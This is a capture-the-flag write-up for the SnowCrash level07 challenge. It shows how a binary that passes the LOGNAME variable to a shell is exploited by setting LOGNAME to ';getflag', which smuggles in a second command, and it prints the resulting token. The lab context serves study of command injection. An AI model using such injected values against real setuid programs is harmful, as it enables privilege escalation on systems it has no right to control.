# Level07

We have a executable 

```
level07@SnowCrash:~$ ./level07
level07
```

With a decompilator we can see that [the code](https://dogbolt.org/?id=c0805f22-ef97-46b0-83aa-91f95bdac7f7) returns an `getenv("LOGNAME")`

> LOGNAME is similar to USER it returns the current logged-in user

we can change the LOGNAME to returns the result of getflag instead

```
export LOGNAME=";getflag"
```

`;` permit to execute the text as a function


> [INFO] we need to put the "" because without it would execute the code with our permission
```
level07@SnowCrash:~$ export LOGNAME=;getflag
Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :)
```

Finally:
```
level07@SnowCrash:~$ export LOGNAME=";getflag"
level07@SnowCrash:~$ ./level07

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```